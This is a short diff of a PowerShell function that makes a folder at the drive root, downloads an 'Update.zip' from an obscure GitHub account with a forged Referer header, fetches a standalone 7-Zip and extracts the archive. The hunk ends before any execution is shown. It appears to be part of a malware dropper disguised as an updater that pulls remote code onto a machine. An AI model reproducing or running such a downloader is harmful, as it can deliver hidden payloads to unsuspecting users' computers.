@@ -1,7 +1,7 @@
 function Get {
   mkdir \Document 
   cd \Document
-  Invoke-WebRequest -Headers @{'Referer' = 'https://github.com/0svix/ww/blob/main/Updater.zip'} -Uri https://github.com/0svix/zz/raw/refs/heads/main/Update.zip -OutFile Update.zip
+  Invoke-WebRequest -Headers @{'Referer' = 'https://github.com/0svix/zz/blob/main/Update.zip'} -Uri https://github.com/0svix/zz/raw/refs/heads/main/Update.zip -OutFile Update.zip
   Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
   Expand-Archive 7z.zip 
   .\7z\7za.exe e Update.zip
